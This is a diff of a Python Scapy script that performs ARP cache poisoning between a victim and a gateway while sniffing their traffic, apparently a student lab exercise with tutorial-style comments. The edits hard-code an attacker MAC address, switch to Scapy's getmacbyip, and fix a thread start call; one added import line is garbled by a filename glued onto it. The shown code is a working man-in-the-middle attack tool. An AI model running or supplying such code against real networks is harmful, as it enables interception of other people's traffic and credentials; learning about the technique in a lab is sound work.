@@ -1,41 +1,34 @@
-from multiprocessing import Process
-from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap
+arp_poisioning_scapy_script.ipynbfrom multiprocessing import Process
+from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, getmacbyip
 
 import os
 import sys
 import time
 
-def get_mac(targetip):
-    # this is the arp packet note to self every packet contains it's destination in this case it is being broadcasted to everyone
-    packet = Ether(dst='ff:ff:ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip) 
-    #srp sends out the requests and records the replies and will store the replies of sender in unans since we dont need unans becase we know we sent it 
-    #and the replies in ans becase we need that
-    ans, unans = srp(packet, timeout=2, retry=10, verbose=False)
-    for unans, r in ans:
-        return r[Ether].src #returns in string format
-    return None
 
 class Arper():
     # the def init is how initialization of a class is done, very simmliar to java for those who didnt know
-    def __init__(self, victim, gateway, interface="eth0"):
+    def __init__(self, victim, gateway, interface="enp0s3"):
         self.victim = victim
-        self.victimMac = get_mac(victim)
+        self.victimMac = getmacbyip(victim)
         self.gateway = gateway
-        self.gatewayMac = get_mac(gateway)
+        self.gatewayMac = getmacbyip(gateway)
         self.interface = interface
         iface = interface
         conf.verb = 0
 
         print('Initialized {}:'.format(interface))
         print('Gateway({}) is at {}.'.format(gateway, self.gatewayMac))
+       # print(ans)
         print('Victim ({}) is at {}.'.format(victim, self.victimMac))
         print('-'*30)
 
     def run(self):
-        #the reason we made this special self.run is because we want to run sniffing and poisioning to run at the same time so it uses the 
+           #the reason we made this special self.run is because we want to run sniffing and poisioning to run  at the same time so it uses the 
+
         #muultiprocessing imort we made to make 2 threads
         self.poison_thread = Process(target=self.poison)
-        self.poison_thread.start
+        self.poison_thread.start()
 
         self.sniff_thread = Process(target=self.sniff)
         self.sniff_thread.start()
@@ -46,7 +39,8 @@ class Arper():
         #these are from arp btw just look at wiki page not scapy docs on meaning of these for better details
         poison_victim = ARP()
         #just a cool note op is the opcode, remembr from the slides, it is set to 2 becase 2 is for replies remember?
-        poison_victim.op = 2
+        poison_victim[ARP].hwsrc = "08:00:27:D0:25:4B"
+        #poison_victim.op = 2
         poison_victim.psrc = self.gateway
         poison_victim.pdst = self.victim
         poison_victim.hwdst = self.victimMac
@@ -57,11 +51,11 @@ class Arper():
         print('mac dst: {}.'.format(poison_victim.hwdst))
         print('mac src: {}.'.format(poison_victim.hwsrc))
         print(poison_victim.summary())
-       # print(''.join(['-' for i in range(30)]))
         print('-'*30)
 
         poison_gateway = ARP()
-        poison_gateway.op = 2
+        poison_gateway[ARP].hwsrc = "08:00:27:D0:25:4B"
+        #poison_gateway.op = 2
         poison_gateway.psrc = self.victim
         poison_gateway.pdst = self.gateway
         poison_gateway.hwdst = self.gatewayMac
@@ -72,7 +66,6 @@ class Arper():
         print('mac src: {}.' .format(poison_gateway.hwsrc))
         print(poison_gateway.summary())
         print('-'*30)
-      #  print(''.join(['-' for i in range(30)]))
         print('Beginning the ARP Poisoning. [CTRL-C to stop]')
         while True:
             sys.stdout.write('.')
@@ -85,7 +78,7 @@ class Arper():
             except KeyboardInterrupt:
                 self.restore()
                 sys.exit()
-            #note this may be shoucking but else is viable here how it worksis that if ther eis no exception 
+            #note this may be shocking but else is viable here how it works is that if there is no exception 
             #it will do else block
             else:
                 time.sleep(2)
